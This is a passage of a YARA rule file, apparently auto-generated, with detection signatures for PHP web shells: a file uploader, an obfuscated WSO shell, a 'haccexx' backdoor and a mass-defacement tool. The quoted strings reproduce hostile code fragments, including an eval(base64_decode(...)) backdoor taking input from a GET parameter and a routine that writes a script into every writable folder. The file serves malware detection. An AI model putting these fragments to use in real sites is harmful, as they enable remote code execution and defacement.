      $s18 = "$eEmoji = array_values($array_emoji);" fullword ascii
      $s19 = "echo 'Alfabeto:' . PHP_EOL . $out;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule php_upup
{
   meta:
      description = "php - file upup.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "adfb97e90bd55757c903d70147a842bb4fa9d633c3c7ae2c7169267328de49fd"
   strings:
      $s1 = "echo \"<br><br><a href=\\\"{$_FILES[\"userfile\"][\"name\"]}\\\" TARGET=_BLANK>{$_FILES[\"userfile\"][\"name\"]}</a><br><br>\";" fullword ascii
      $s2 = "echo \"<form enctype=\\\"multipart/form-data\\\" action=\\\"{$_SERVER[\"PHP_SELF\"]}\\\" method=\\\"POST\\\">\";" fullword ascii
      $s3 = "if (move_uploaded_file($_FILES[\"userfile\"][\"tmp_name\"], $uploadfile))  {" fullword ascii
      $s4 = "$uploadfile = $uploaddir . basename($_FILES[\"userfile\"][\"name\"]);" fullword ascii
      $s5 = "echo \"Select Your File : <input name=\\\"userfile\\\" type=\\\"file\\\" />\";" fullword ascii
      $s6 = "if ($_FILES[\"userfile\"][\"error\"] == 0)  {" fullword ascii
      $s7 = "$uploaddir = getcwd() . \"/\";" fullword ascii
      $s8 = "echo \"<input type=\\\"hidden\\\" name=\\\"MAX_FILE_SIZE\\\" value=\\\"512000\\\" />\";" fullword ascii
      $s9 = "<?php if (isset($_FILES[\"userfile\"][\"name\"]))  {" fullword ascii
      $s10 = "echo \"<input type=\\\"submit\\\" value=\\\"Upload\\\" />\";" fullword ascii
      $s11 = "echo \"Failed To Upload\";" fullword ascii
      $s12 = "echo getcwd() . \"\\n\";" fullword ascii
      $s13 = "echo \"Upload Successful\\n\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule wso_gold_hun73r
{
   meta:
      description = "php - file wso-gold-hun73r.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "a1b18c58e9a77ec5a1afdccc789c8a6cbaab000f4037b374428c2c3cde3f2970"
   strings:
      $x1 = "<?php $A = 0;$B = 1;$C = 1;$D = 1;$E = 4;$F = 5;$G = 6;$H = 6;$I = 8;$J = 0;$aa = $aA = $bB = $cC = $dD  = $eE = $fF =  $gG = ''" ascii
      $s2 = "$Aa);}for($xVWxR=0;$xVWxR<$aa($bRtRT);$xVWxR++){$gG[$xVWxR] =  $bB($bRtRT[$xVWxR]);}if(gettype($gG)=='array'){$gG = implode(''," fullword ascii
      $s3 = "$gG);}for($XXOX=$OdRT;$XXOX<$aa($KIOpE);$XXOX++){$aA[$XXOX] = $bB($KIOpE[$XXOX]);}if(gettype($aA)=='array'){$aA = implode('', $" fullword ascii
      $s4 = "cIbT/XNXSNxULP/YSqb+Y3FTPbeyWVAvm8fDftM3EIaV5uGheMDqX7Q490Bte7Ad/M//fTg6/5//h525YCMw0pqIB4PpthXjYZjb+B+nnUEwdo2HvV6zYiZkukhZivqg" ascii
      $s5 = "NzQBaqBXp2v4djxhksDqSyUypLgNyKkCThE5SAyQT3KKnQCuK2/qoq5QtAHU5FV8BfzAcI6UCmGET300NGGKX12EjiP+FRq9Zcb6BGST4z/gVyC9u3fDOREkb3zHcWFk" ascii
      $s6 = "bdc+vE3PjzvNaXS8LIXWo0UYlMNl8Gc4De4PQgftou+F8K3ulx/4Tv52ajvLhRvrB+N6/HL6GjR73aPBScv0qHCeGIrcD/qd6fGwvTUaQabm9Jz3OlvFw+FgumnY7Gp7" ascii
      $s7 = "SapOQ26nFDnHJDPH6tvg5XAhjnJBQETOwVDKbdrYHVSNdBVeNuhn+K5GSCRyikn3dfbJQ782EuYitVWw7txSfKbdrUAkvyc1ZTNUk0lbSyacrwyYMwQD18sKRlraULoG" ascii
      $s8 = "feeNftPl6XcvMxlp46QdtsoIlaI381LitMhnQdOmjz0rlKOs6av+kH7Uy0qIySVPM9vdYcY+DkB9aivc7N6QGllUrcw1ESnkw6fip5IRvY6mx5vXr3RE9fNYf+h+KukG" ascii
      $s9 = "MocdgdsVqWFA81XlX4eQx7KprSXdmqI18YS24Zj6vGycWb01jdKYEJOlnCkJxbBv0WHWvEyehpc1YTQLB0MHQ0D6UY2JxBh27m2KjSsTQBnfNQ4qOVW7OFZokttul6gT" ascii
      $s10 = "7Zx2zLnCcfOxpkjOWLf2z38Gv5oZHw0ny2byc9htSjO52EmuenrNw7XrJWil3OaKKyiwstO2cQEFNtu52FoKpoTgC+bdlygtNoqD8fZSiRc80CqTOtUuPgrMmc08kstd" ascii
      $s11 = "b3OvWDVpT/nj2cLQWrwc2myffQ6dxXN+geYEIPEoDNH1CPocrpvqieVXcsCcZvLO6wb85ZcLtv1Celfd6TNAyzRGfRrpx8L0kermno1htBLoYq3mdW067sjDybL8Rvrt" ascii
      $s12 = "mDwtT2B5zv4wysCVSJaNIw7spYHNqzMktU7KlsjlmaPtofwzHT2VxTlZOaaPq9JAiBSXRQFV7Aet4bY0eY2efpw2b/1op2RXFtlLGdC6nAiKY6UAQQ6nBWB9xIlA4a1Y" ascii
      $s13 = "o6I36efpD+bm7DRbx8EyWiY26ldg6MeSucu3ttFEGuHS4D72xOT0YDIdcGurwU1sNShmQuyu0KJpG4yOVIVgJTNGpgS+vrG98GCU/JvnD5+bnx/fL35N+eUXu5p0cMPZ" ascii
      $s14 = "HkQZ28FN0vCTR7eFypW0A0Std4cVh/VnkVxSie9qGDdx/nZheEUm9I+w2HN607obS8eaL0aPcXVyXyaqSnla9YpiLJJXcN98zXcOg8hCRFq6E9V2kXeyE6q1OvXHPlXS" ascii
      $s15 = "hgadJHiI5uMjIwbIGVK0Rz02wco0OHLGP7TigutsaUdGPBHeW5Pak65DYXGvutToTnxMlBX6UjAPGJ0oUQrY44SB/ohPnspYZlAZ1BaGMoivEsrgRWT2aoQyAGCQuFIg" ascii
      $s16 = "ygYa5ToFHVY0mEUm+QgUH6R00ficSC9sSpUpb0UCubrBlBUkkfK61pxwF8lt8ohmZKolOKORU1Kcg1sxZ6z8AACTM6vUgF0hSRkhKsjVSOEYES8JBAWWHSDak5Kxpop4" ascii
      $s17 = "BwuGnWiK1ToU+uEdS81xXDwtF80KuFHMWJGe0ME9Z7rOi3R1t9N5B4emht8xTocXbQNfMmOclj94ZhDLLkZD7J+YUi9vKtpKm4onzZPMSeGz+ROz0v4js/I7J+Lq+8HO" ascii
      $s18 = "6gF8xknhVeHwcSeHfFQaXEuJyIFG/brYJo0kbhFWgS6zDlLrAfaJkDQI6EvxXC1cdThzLu5OAjqrhYACW1QwsHNZVzVyrNKWoDFvWr6GNHPxERo7DtiSqPXK80hrwhkF" ascii
      $s19 = "vcePf6WXNqLz/Dbgp8sFC0Jpntxbe90ZQsS/MCqFtoQd7LJBhGgGacOVn2hnq4GrdHLTbf2ZrfZ/Aw=='));?>" fullword ascii
      $s20 = "p61huxnsmSeb6eLk5tTcTXVwd8lVyVWzUNOGruydxP5U7/8yHQ57k5cHvTnbImP7T4pCU83B6mS02lkrC8PDwygOrmj7lr41B0Zf0B6v7/nr3lmNFDiOoCn8rhep3NyV" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule php_haccexx
{
   meta:
      description = "php - file haccexx.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "44ffe4b53bbdc6ce12ca7d279a8e9ed1620a458d65652673449b81f8956d6672"
   strings:
      $s1 = "(@copy($_FILES[\"file\"][\"tmp_name\"], $_FILES[\"file\"][\"name\"])); ?>" fullword ascii
      $s2 = "$ev = $_GET[\"ev\"];" fullword ascii
      $s3 = "eval(base64_decode($ev));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _1945_cumaiseng_0
{
   meta:
      description = "php - from files 1945.php, cumaiseng.php"
      author = "WatcherLab"
      date = "2019-02-21"
      hash1 = "05e44cb354717131ec828a5f536743da7ef19e3baec2f3fbe9a9099f1b4eb737"
      hash2 = "2149e1e79c98410e14c09b6bc8b7b47fca777e7430634e0265a8bca498fad0c5"
   strings:
      $s1 = "sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);" fullword ascii
      $s2 = "$idx = sabun_massal($dirc,$namafile,$isi_script);" fullword ascii
      $s3 = "<input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br>" fullword ascii
      $s4 = "file_put_contents($lokasi, $isi_script);" fullword ascii
      $s5 = "return curl_exec($ch);" fullword ascii
      $s6 = "function sabun_massal($dir,$namafile,$isi_script) {" fullword ascii
      $s7 = "echo \"<form method='post'>" fullword ascii
      $s8 = "$lokasi = $dirc.'/'.$namafile;" fullword ascii
      $s9 = "<font style='text-decoration: underline;'>Index File:</font><br>" fullword ascii
      $s10 = "if(is_writable($dirc)) {" fullword ascii
      $s11 = "curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);" fullword ascii
      $s12 = "<form method='post'>" fullword ascii
      $s13 = "<font style='text-decoration: underline;'>Folder:</font><br>" fullword ascii
      $s14 = "<font style='text-decoration: underline;'>Filename:</font><br>" fullword ascii
      $s15 = "$dirc = \"$dir/$dirb\";" fullword ascii
      $s16 = "if($_POST['start']) {" fullword ascii
      $s17 = "if(is_dir($dirc)) {" fullword ascii
      $s18 = "echo \"<div style='margin: 5px auto; padding: 5px'>\";" fullword ascii
      $s19 = "echo \"[<font color=lime>DONE</font>] $lokasi<br>\";" fullword ascii
      $s20 = "} elseif (($perms & 0xA000) == 0xA000) {" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

